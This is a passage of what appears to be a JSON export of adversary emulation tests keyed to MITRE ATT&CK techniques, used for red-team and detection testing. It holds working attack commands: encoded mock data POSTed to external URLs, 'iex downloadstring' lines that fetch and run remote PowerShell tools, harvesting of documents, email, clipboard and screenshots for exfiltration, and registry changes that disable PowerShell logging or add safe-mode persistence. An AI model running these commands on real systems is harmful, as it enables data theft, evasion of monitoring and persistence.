extension, please see \"T1133\\src\\list of vpn extension.txt\" to view complete list\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | chrome_url | chrome installer download URL | Url | https://dl.google.com/tag/s/appguid%3D%7B8A69D345-D564-463C-AFF1-A69D9E530F96%7D%26iid%3D%7BFD62DDBC-14C6-20BD-706F-C7744738E422%7D%26lang%3Den%26browser%3D3%26usagestats%3D0%26appname%3DGoogle%2520Chrome%26needsadmin%3Dprefers%26ap%3Dx64-stable-statsdef_1%26installdataindex%3Dempty/chrome/install/ChromeStandaloneSetup64.exe | \n | extension_id | chrome extension id | String | \"fcfhplploccackoneaefokcmbjfbkenj\", \"fdcgdnkidjaadafnichfpabhfomcebme\"\n | "}, "executionSteps": [{"description": "$extList = #{extension_id}\nforeach ($extension in $extList) {\n  New-Item -Path HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension -Force\n  New-ItemProperty -Path \"HKLM:\\Software\\Wow6432Node\\Google\\Chrome\\Extensions\\$extension\" -Name \"update_url\" -Value \"https://clients2.google.com/service/update2/crx\" -PropertyType \"String\" -Force}\nStart chrome\nStart-Sleep -Seconds 30\nStop-Process -Name \"chrome\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5rk02q629mqd2xa8nnj", "clacwm1v400ed29mq1ofaf06r"], "tags": []}, {"data": {"name": "XOR Encoded data.", "shortName": "T1132.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "XOR encodes the data with a XOR key.\nReference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | destination_url | Destination URL to post encoded data. | Url | example.com | \n | plaintext | Plain text mimicking victim data sent to C2 server. | String | Path\\n----\\nC:\\Users\\victim | \n | key | XOR key used for encoding the plaintext. | String | abcdefghijklmnopqrstuvwxyz123456 | "}, "executionSteps": [{"description": "$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"#{plaintext}\"))\n$key = \"#{key}\"\n$cyphertext =  @();\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\n}\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\n[System.Net.ServicePointManager]::Expect100Continue = $false\nInvoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive\n", "successCriteria": null}], "techniqueIds": ["clacwm5pm02ny29mq324c50n8"], "tags": []}, {"data": {"name": "Base64 Encoded data.", "shortName": "T1132.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilizing a common technique for posting base64 encoded data.\n\n\n**Supported Platforms:** macos, linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | destination_url | Destination URL to post encoded data. | Url | redcanary.com | \n | base64_data | Encoded data to post using fake Social Security number 111-11-1111. | String | MTExLTExLTExMTE= | "}, "executionSteps": [{"description": "echo -n 111-11-1111 | base64\ncurl -XPOST #{base64_data}.#{destination_url}\n", "successCriteria": null}], "techniqueIds": ["clacwm5pm02ny29mq324c50n8", "clacwm2gy00v829mqc1ulam2l"], "tags": []}, {"data": {"name": "MSBuild Bypass Using Inline Tasks (VB)", "shortName": "T1127.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code in a project file using msbuild.exe. The default Visual Basic example file (vb.xml) will simply print \"Hello from a Visual Basic inline task!\" to the screen.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | Location of the project file | Path | PathToAtomicsFolder\\T1127.001\\src\\vb.xml | \n | msbuildpath | Default location of MSBuild | Path | C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 | \n | msbuildname | Default name of MSBuild | Path | msbuild.exe | "}, "executionSteps": [{"description": "#{msbuildpath}\\#{msbuildname} #{filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mw03nd29mqcqii4reh", "clacwm22r00jh29mqem71fqyy"], "tags": []}, {"data": {"name": "MSBuild Bypass Using Inline Tasks (C#)", "shortName": "T1127.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Executes the code in a project file using msbuild.exe. The default C# project example file (T1127.001.csproj) will simply print \"Hello From a Code Fragment\" and \"Hello From a Class.\" to the screen.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | Location of the project file | Path | PathToAtomicsFolder\\T1127.001\\src\\T1127.001.csproj | \n | msbuildpath | Default location of MSBuild | Path | C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 | \n | msbuildname | Default name of MSBuild | Path | msbuild.exe | "}, "executionSteps": [{"description": "#{msbuildpath}\\#{msbuildname} #{filename}\n", "successCriteria": null}], "techniqueIds": ["clacwm6mw03nd29mqcqii4reh", "clacwm22r00jh29mqem71fqyy"], "tags": []}, {"data": {"name": "Lolbin Jsc.exe compile javascript to exe", "shortName": "T1127", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | Location of the project file | Path | PathToAtomicsFolder\\T1127\\src\\hello.js | \n | jscpath | Default location of jsc.exe | Path | C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 | \n | jscname | Default name of jsc | Path | jsc.exe | "}, "executionSteps": [{"description": "copy #{filename} %TEMP%\\hello.js\n#{jscpath}\\#{jscname} %TEMP%\\hello.js\n", "successCriteria": null}], "techniqueIds": ["clacwm6vi03wo29mqgooyeuot"], "tags": []}, {"data": {"name": "Lolbin Jsc.exe compile javascript to dll", "shortName": "T1127", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.\nhttps://lolbas-project.github.io/lolbas/Binaries/Jsc/\nhttps://www.phpied.com/make-your-javascript-a-windows-exe/\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | filename | Location of the project file | Path | PathToAtomicsFolder\\T1127\\src\\LibHello.js | \n | jscpath | Default location of jsc.exe | Path | C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319 | \n | jscname | Default name of jsc | Path | jsc.exe | "}, "executionSteps": [{"description": "copy #{filename} %TEMP%\\LibHello.js\n#{jscpath}\\#{jscname} /t:library %TEMP%\\LibHello.js\n", "successCriteria": null}], "techniqueIds": ["clacwm6vi03wo29mqgooyeuot"], "tags": []}, {"data": {"name": "Registry artefact when application use webcam", "shortName": "T1125", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\webcam\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm698038129mq3k7ebh69"], "tags": []}, {"data": {"name": "System Time Discovery W32tm as a Delay", "shortName": "T1124", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2\n", "successCriteria": null}], "techniqueIds": ["clacwm6th03ul29mqejxk8epp"], "tags": []}, {"data": {"name": "System Time Discovery in macOS", "shortName": "T1124", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify system time. Upon execution, the local computer system time and timezone will be displayed. \n\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "date\n", "successCriteria": null}], "techniqueIds": ["clacwm6th03ul29mqejxk8epp"], "tags": []}, {"data": {"name": "System Time Discovery - PowerShell", "shortName": "T1124", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify the system time via PowerShell. Upon execution, the system time will be displayed.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-Date\n", "successCriteria": null}], "techniqueIds": ["clacwm6th03ul29mqejxk8epp", "clacwm2il00wk29mq07iv3y4n"], "tags": []}, {"data": {"name": "System Time Discovery", "shortName": "T1124", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Identify the system time. Upon execution, the local computer system time and timezone will be displayed.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | computer_name | computer name to query | String | localhost | "}, "executionSteps": [{"description": "net time \\\\#{computer_name}\nw32tm /tz\n", "successCriteria": null}], "techniqueIds": ["clacwm6th03ul29mqejxk8epp", "clacwm2il00wk29mq07iv3y4n"], "tags": []}, {"data": {"name": "using device audio capture commandlet", "shortName": "T1123", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet\n", "successCriteria": null}], "techniqueIds": ["clacwm5rh02q129mq3u2heltl", "clacwm1de003029mqdozj02yj"], "tags": []}, {"data": {"name": "Registry artefact when application use microphone", "shortName": "T1123", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "[can-you-track-processes-accessing-the-camera-and-microphone](https://svch0st.medium.com/can-you-track-processes-accessing-the-camera-and-microphone-7e6885b37072)\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\CapabilityAccessManager\\ConsentStore\\microphone\\NonPackaged\\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm5rh02q129mq3u2heltl"], "tags": []}, {"data": {"name": "WinPwn - printercheck", "shortName": "T1120", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search for printers / potential vulns using printercheck function of WinPwn\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput", "successCriteria": null}], "techniqueIds": ["clacwm5yj02x829mqdkk12ooa"], "tags": []}, {"data": {"name": "Win32_PnPEntity Hardware Inventory", "shortName": "T1120", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt", "successCriteria": null}], "techniqueIds": ["clacwm5yj02x829mqdkk12ooa", "clacwm28t00ny29mqe63k8mo2"], "tags": []}, {"data": {"name": "Recon information for export with PowerShell", "shortName": "T1119", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Get-Service > $env:TEMP\\T1119_1.txt\nGet-ChildItem Env: > $env:TEMP\\T1119_2.txt\nGet-Process > $env:TEMP\\T1119_3.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5xd02wa29mqdboc7r6v", "clacwm1dw003529mq57sl8fou"], "tags": []}, {"data": {"name": "Recon information for export with Command Prompt", "shortName": "T1119", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "collect information for exfiltration. Upon execution, check the users temp directory (%temp%) for files T1119_*.txt\nto see what was collected.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "sc query type=service > %TEMP%\\T1119_1.txt\ndoskey /history > %TEMP%\\T1119_2.txt\nwmic process list > %TEMP%\\T1119_3.txt\ntree C:\\AtomicRedTeam\\atomics > %TEMP%\\T1119_4.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5xd02wa29mqdboc7r6v", "clacwm1dw003529mq57sl8fou"], "tags": []}, {"data": {"name": "Automated Collection PowerShell", "shortName": "T1119", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_powershell_collection\nto see what was collected.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "New-Item -Path $env:TEMP\\T1119_powershell_collection -ItemType Directory -Force | Out-Null\nGet-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination $env:TEMP\\T1119_powershell_collection}\n", "successCriteria": null}], "techniqueIds": ["clacwm5xd02wa29mqdboc7r6v", "clacwm1dw003529mq57sl8fou"], "tags": []}, {"data": {"name": "Automated Collection Command Prompt", "shortName": "T1119", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Automated Collection. Upon execution, check the users temp directory (%temp%) for the folder T1119_command_prompt_collection\nto see what was collected.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "mkdir %temp%\\T1119_command_prompt_collection >nul 2>&1\ndir c: /b /s .docx | findstr /e .docx\nfor /R c: %f in (*.docx) do copy %f %temp%\\T1119_command_prompt_collection\n", "successCriteria": null}], "techniqueIds": ["clacwm5xd02wa29mqdboc7r6v", "clacwm1dw003529mq57sl8fou"], "tags": []}, {"data": {"name": "Utilize Clipboard to store or execute commands from", "shortName": "T1115", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Add data to clipboard to copy off or execute commands from.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "dir | clip\necho \"T1115\" > %temp%\\T1115.txt\nclip < %temp%\\T1115.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5xg02wc29mq7d1p98zd", "clacwm1gp004t29mqdxfe6sz4"], "tags": []}, {"data": {"name": "Execute Commands from Clipboard using PowerShell", "shortName": "T1115", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize PowerShell to echo a command to clipboard and execute it\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "echo Get-Process | clip\nGet-Clipboard | iex\n", "successCriteria": null}], "techniqueIds": ["clacwm5xg02wc29mq7d1p98zd", "clacwm1gp004t29mqdxfe6sz4"], "tags": []}, {"data": {"name": "Execute commands from clipboard", "shortName": "T1115", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Echo a command to clipboard and execute it\n\n**Supported Platforms:** macos\n\n"}, "executionSteps": [{"description": "echo ifconfig | pbcopy\n$(pbpaste)", "successCriteria": null}], "techniqueIds": ["clacwm5xg02wc29mq7d1p98zd", "clacwm1gp004t29mqdxfe6sz4"], "tags": []}, {"data": {"name": "Collect Clipboard Data via VBA", "shortName": "T1115", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This module copies the data stored in the user's clipboard and writes it to a file, $env:TEMP\\atomic_T1115_clipboard_data.txt\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | ms_product | Maldoc application Word | String | Word | "}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nSet-Clipboard -value \"Atomic T1115 Test, grab data from clipboard via VBA\"\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing)\nInvoke-Maldoc -macroFile \"PathToAtomicsFolder\\T1115\\src\\T1115-macrocode.txt\" -officeProduct \"Word\" -sub \"GetClipboard\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5xg02wc29mq7d1p98zd", "clacwm1gp004t29mqdxfe6sz4"], "tags": []}, {"data": {"name": "Add or copy content to clipboard with xClip", "shortName": "T1115", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Utilize Linux Xclip to copy history and place in clipboard then output to a history.txt file. Successful execution will capture history and output to a file on disk.\n\n\n**Supported Platforms:** linux\n\n"}, "executionSteps": [{"description": "apt install xclip -y\nhistory | tail -n 30 | xclip -sel clip\nxclip -o > history.txt\n", "successCriteria": null}], "techniqueIds": ["clacwm5xg02wc29mq7d1p98zd"], "tags": []}, {"data": {"name": "Email Collection with PowerShell Get-Inbox", "shortName": "T1114.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Search through local Outlook installation, extract mail, compress the contents, and saves everything to a directory for later exfiltration.\nSuccessful execution will produce stdout message stating \"Please be patient, this may take some time...\". Upon completion, final output will be a mail.csv file.\n\nNote: Outlook is required, but no email account necessary to produce artifacts.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | String | $env:TEMP\\mail.csv | \n | file_path | File path for Get-Inbox.ps1 | String | PathToAtomicsFolder\\T1114.001\\src | "}, "executionSteps": [{"description": "powershell -executionpolicy bypass -command #{file_path}\\Get-Inbox.ps1 -file #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5u602sz29mqa1kt6pq4", "clacwm22e00j729mqfls693d0"], "tags": []}, {"data": {"name": "X Windows Capture", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use xwd command to collect a full desktop screenshot and review file with xwud\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | Path | /tmp/T1113_desktop.xwd | \n | package_checker | Package checking command for linux. Debian system command- dpkg -s x11-apps | String | rpm -q xorg-x11-apps | \n | package_installer | Package installer command for linux. Debian system command- apt-get install x11-apps | String | yum install -y xorg-x11-apps | "}, "executionSteps": [{"description": "xwd -root -out #{output_file}\nxwud -in #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1", "clacwm2dx00si29mq7r3u9jgb"], "tags": []}, {"data": {"name": "Windows Screencapture", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use Psr.exe binary to collect screenshots of user display. Test will do left mouse click to simulate user behaviour\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | Path | c:\\temp\\T1113_desktop.zip | \n | recording_time | Time to take screenshots | String | 5 | "}, "executionSteps": [{"description": "cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12\nAdd-Type -MemberDefinition '[DllImport(\"user32.dll\")] public static extern void mouse_event(int flags, int dx, int dy, int cButtons, int info);' -Name U32 -Namespace W;\n[W.U32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0);\ncmd /c \"timeout #{recording_time} > NULL && psr.exe /stop\"\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1", "clacwm2dx00si29mq7r3u9jgb"], "tags": []}, {"data": {"name": "Windows Screen Capture (CopyFromScreen)", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Take a screen capture of the desktop through a call to the [Graphics.CopyFromScreen] .NET API.\n\n[Graphics.CopyFromScreen]: https://docs.microsoft.com/en-us/dotnet/api/system.drawing.graphics.copyfromscreen\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where captured results will be placed | Path | $env:TEMP\\T1113.png | "}, "executionSteps": [{"description": "Add-Type -AssemblyName System.Windows.Forms\n$screen = [Windows.Forms.SystemInformation]::VirtualScreen\n$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height\n$graphic = [Drawing.Graphics]::FromImage($bitmap)\n$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)\n$bitmap.Save(\"#{output_file}\")\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1"], "tags": []}, {"data": {"name": "Screencapture (silent)", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use screencapture command to collect a full desktop screenshot\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | Path | /tmp/T1113_desktop.png | "}, "executionSteps": [{"description": "screencapture -x #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1", "clacwm2dx00si29mq7r3u9jgb"], "tags": []}, {"data": {"name": "Screencapture", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use screencapture command to collect a full desktop screenshot\n\n\n**Supported Platforms:** macos\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | Path | /tmp/T1113_desktop.png | "}, "executionSteps": [{"description": "screencapture #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1", "clacwm2dx00si29mq7r3u9jgb"], "tags": []}, {"data": {"name": "Capture Linux Desktop using Import Tool", "shortName": "T1113", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Use import command from ImageMagick to collect a full desktop screenshot\n\n\n**Supported Platforms:** linux\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Output file path | Path | /tmp/T1113_desktop.png | "}, "executionSteps": [{"description": "import -window root #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm5p602nc29mqaxwc3qb1", "clacwm2dx00si29mq7r3u9jgb"], "tags": []}, {"data": {"name": "Windows Powershell Logging Disabled", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nREM do a little cleanup immediately to avoid execution issues with later tests\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows Modify Show Compress Color And Info Tip Registry", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows HideSCAVolume Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows HideSCAPower Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows HideSCANetwork Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows HideSCAHealth Group Policy Feature", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows Add Registry Value to Load Service in Safe Mode without Network", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n", "successCriteria": null}], "techniqueIds": ["clacwm659033r29mq212b1exl"], "tags": []}, {"data": {"name": "Windows Add Registry Value to Load Service in Safe Mode with Network", "shortName": "T1112", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into 